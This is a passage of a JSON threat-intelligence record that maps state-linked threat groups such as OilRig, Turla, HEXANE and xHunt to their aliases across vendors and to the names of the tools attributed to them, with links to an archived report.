            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7df240e-6750-4b71-99de-85831b92faa2",
            "created_at": "2022-10-25T15:50:23.859253Z",
            "updated_at": "2025-03-27T02:00:55.546377Z",
            "deleted_at": null,
            "main_name": "HEXANE",
            "aliases": [
                "Lyceum",
                "Siamesekitten",
                "Spirlin"
            ],
            "source_name": "MITRE:HEXANE",
            "tools": [
                "Milan",
                "netstat",
                "BITSAdmin",
                "DnsSystem",
                "DanBot",
                "ipconfig",
                "Mimikatz",
                "Kevin",
                "PoshC2"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "fb8f3a5f-01a9-498e-9396-52f844424c33",
            "created_at": "2023-01-06T13:46:39.045338Z",
            "updated_at": "2025-03-27T02:00:02.984648Z",
            "deleted_at": null,
            "main_name": "LYCEUM",
            "aliases": [
                "siamesekitten",
                "Chrono Kitten",
                "Storm-0133",
                "COBALT LYCEUM",
                "UNC1530",
                "Spirlin",
                "MYSTICDOME"
            ],
            "source_name": "MISPGALAXY:LYCEUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1579727535,
    "ts_modification_date": 1579727548,
    "files": {
        "pdf": "https://archive.orkl.eu/a83f4b160e2543812bf9ee048af1d8ce27aaa730.pdf",
        "text": "https://archive.orkl.eu/a83f4b160e2543812bf9ee048af1d8ce27aaa730.txt",
        "img": "https://archive.orkl.eu/a83f4b160e2543812bf9ee048af1d8ce27aaa730.jpg"
    }
}